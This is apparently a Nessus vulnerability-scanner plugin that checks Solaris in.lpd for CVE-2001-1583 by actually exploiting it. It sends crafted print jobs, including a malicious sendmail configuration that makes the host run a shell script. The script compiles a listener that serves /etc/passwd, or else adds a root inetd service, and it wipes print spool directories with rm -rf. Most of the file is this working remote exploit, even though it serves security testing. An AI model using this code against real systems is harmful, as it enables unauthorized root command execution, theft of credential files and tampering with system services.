#
# (C) Tenable Network Security, Inc.
#

# This script attempts to compile a program which will send
# us /etc/passwd. If no compiler is installed on the remote system,
# then it adds a service (id) in inetd.conf, on port 1.
#
# Ref: remorse [http://web.archive.org/web/20040506190754/http://www.geocities.com/entrelaspiernas/], by ron1n <shellcode@hotmail.com>

include( 'compat.inc' );

if(description)
{
  script_id(11513);
  script_version ("$Revision: 1.23 $");
  script_cve_id("CVE-2001-1583");
  script_bugtraq_id(3274);
  script_osvdb_id(15131);

  script_name(english:"Solaris in.lpd Crafted Job Request Arbitrary Remote Command Execution");
  script_summary(english:"Reads the remote password file, thanks to lpd");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote lpd daemon is vulnerable to arbitrary command execution.'
  );

  script_set_attribute(
    attribute:'description',
    value:'The remote lpd daemon is vulnerable to an
environment error that could allow an attacker
to execute arbitrary commands on this host.

Nessus uses this vulnerability to retrieve the
password file of the remote host although any
command could be executed.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'None at this time. Disable this service.'
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Solaris LPD Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(
    attribute:'see_also',
    value:'http://seclists.org/bugtraq/2001/Aug/437'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/04/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/08/31");
 script_cvs_date("$Date: 2016/12/09 21:14:09 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK); # Intrusive?
  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_require_ports("Services/lpd", 515);
  script_dependencies("find_service1.nasl");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

CTRL = 2;
DATA = 3;
MAGIC_PORT = get_host_open_port();
if(MAGIC_PORT <= 1 || MAGIC_PORT == 139 || MAGIC_PORT == 445 )MAGIC_PORT = 39876;
else MAGIC_PORT --;

function intro(soc)
{
 local_var ack;
 send(socket:soc, data:raw_string(0x2));
 send(socket:soc, data:crap(data:"/", length:1010));
 send(socket:soc, data:string("NESSUS\n"));
 ack = recv(socket:soc, length:1);
 if(ack == NULL)exit(0);
}


function xfer(soc, type, buf, dst)
{
 local_var r, req;

 req = raw_string(type) + string(strlen(buf), " ", dst, "\n");
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1);
 if(r == NULL)exit(0);
 send(socket:soc, data:buf);
 send(socket:soc, data:raw_string(0));
 r = recv(socket:soc, length:1);
 if(r == NULL)exit(0);
}



mailcf = "V8

Ou0
Og0
OL0
Oeq
OQ/tmp

FX|/bin/sh /var/spool/lp/tmp/<REPLACEME>/script

S3
S0
R$+     $#local $@blah $:blah
S1
S2
S4
S5

Mlocal  P=/bin/sh, F=S, S=0, R=0, A=sh /var/spool/lp/tmp/<REPLACEME>/script
Mprog   P=/bin/sh, F=S, S=0, R=0, A=sh /var/spool/lp/tmp/<REPLACEME>/script";



script = '
#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/ucb:/usr/local/bin:/usr/local/sbin:/usr/xpg4/bin:/opt/sfw/bin:/usr/ccs/bin
export PATH
cd /tmp

where=`which gcc 2>&1 | grep -v "no $1"`
test -n "$where" && CC=gcc
test -z "$CC" && {
	where=`which cc 2>&1 | grep -v "no $1"`
	test -n "$where" && CC=cc
	if [ -z "$CC" ]; then  echo "tcpmux stream tcp nowait root /usr/bin/id id" > ic ; /usr/bin/inetd -s ic; rm ic; exit ; fi
	}
cat > c.c << __EOF__
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
int main(int argc, char **argv)
{
int sd, cd;
int fd;
char buf[4096];
int so = 1;

struct sockaddr_in saddr;
memset(&saddr, 0, sizeof saddr);
saddr.sin_family = AF_INET;
saddr.sin_port = htons(MAGIC_PORT);
saddr.sin_addr.s_addr = htonl(INADDR_ANY);
sd = socket(AF_INET, SOCK_STREAM, 0);
setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &so, sizeof(so));
bind(sd, (struct sockaddr *) &saddr, sizeof saddr);
listen(sd, 1);
cd = accept(sd, NULL, NULL);

fd = open("/etc/passwd", O_RDONLY);
if(fd < 0)write(cd, "exploit worked", strlen("exploit worked"));
else {read(fd, buf, sizeof(buf) - 1);close(fd);}
buf[sizeof(buf) - 1] = 0;
write(cd, buf, strlen(buf));
shutdown(cd, 2);
close(cd);
exit(0);
}
__EOF__

$CC -o c c.c -lsocket
./c &
rm -f c.c c
rm -rf /var/spool/lp/tmp/*
rm -rf /var/spool/lp/requests/*';


control =
'Hnessus
P\\"-C/var/spool/lp/tmp/<REPLACEME>/mail.cf\\" nobody
fdfA123config
fdfA123script';


script = ereg_replace(string:script, pattern:"MAGIC_PORT", replace:string(MAGIC_PORT));
mailcf  = ereg_replace(string:mailcf, pattern:"<REPLACEME>", replace:this_host_name());
control = ereg_replace(string:control, pattern:"<REPLACEME>", replace:this_host_name());


port = get_service(svc:"lpd", default: 515, exit_on_fail: 1);

soc = open_priv_sock_tcp(dport:port);
if(!soc)exit(1, "Could not connect to TCP port "+port+".");

soc1 = open_priv_sock_tcp(dport:port);
if(!soc1)exit(1, "Could not connect to TCP port "+port+".");

intro(soc:soc);
xfer(soc:soc, type:CTRL, buf:control, dst:"cfA123nessus");
xfer(soc:soc, type:DATA, buf:mailcf, dst:"mail.cf");
xfer(soc:soc, type:DATA, buf:script, dst:"script");
send(socket:soc, data:raw_string(2) + '!\n');
close(soc);


intro(soc:soc1);
xfer(soc:soc1, type:CTRL, buf:control, dst:"cfA123nessus");
xfer(soc:soc1, type:DATA, buf:mailcf, dst:"dfA123config");
xfer(soc:soc1, type:DATA, buf:script, dst:"dfA123script");
close(soc1);


sleep(10);

soc = open_sock_tcp(MAGIC_PORT);
if(!soc){
 soc = open_sock_tcp(1);
 if(soc){
 	r = recv_line(socket:soc, length:4096);
 	if(egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r))security_hole(port);
	}
  exit(0);
}

r = recv(socket:soc, length:4096);
if(r)
{
 if("exploit worked" >< r )security_hole(port);  # Worked but could not open /etc/passwd...
 else if(egrep(pattern:".*root:.*:0:", string:r))
 {
 report = "The remote lpd daemon is vulnerable to an
environment error which may allow an attacker
to execute arbitrary commands on this host.

We used this vulnerability to retrieve an extract of /etc/passwd  :

" + r;


  security_hole(port:port, extra:report);
 }
}
